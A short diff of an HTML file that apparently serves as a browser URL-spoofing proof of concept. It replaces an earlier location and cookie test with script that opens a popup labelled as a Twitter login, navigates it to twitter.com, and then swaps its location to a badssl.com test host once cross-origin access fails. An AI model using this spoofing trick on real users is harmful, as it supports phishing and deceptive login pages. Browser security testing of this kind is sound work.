@@ -1,14 +1,12 @@
-<body>
-    <script>
-        if (document.cookie.includes('here=1')) {
-            document.cookie = "here=0";
-            alert('This is not localhost:3000, real location:' + location);
-        } else {
-            document.cookie = 'here=1';
-            alert('I am going .back(), real location' + location);
-            history.back();
+<script>
+  function next() {
+         w.location.replace('http://wrong.host.badssl.com/');
         }
-        document.write('<h1>' + location + '</h1>')
-    </script>
-    <a href="https://www.whatismyreferer.com/" /> What's my referrer?</a>
-</body>
+
+  function f() {
+    w = window.open("javascript:document.write('spoof');location='http://twitter.com'","new","width=500 height=500");
+    i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 1); 
+  }
+</script>
+
+<a href="#" onclick="f()">Login Twitter</a>
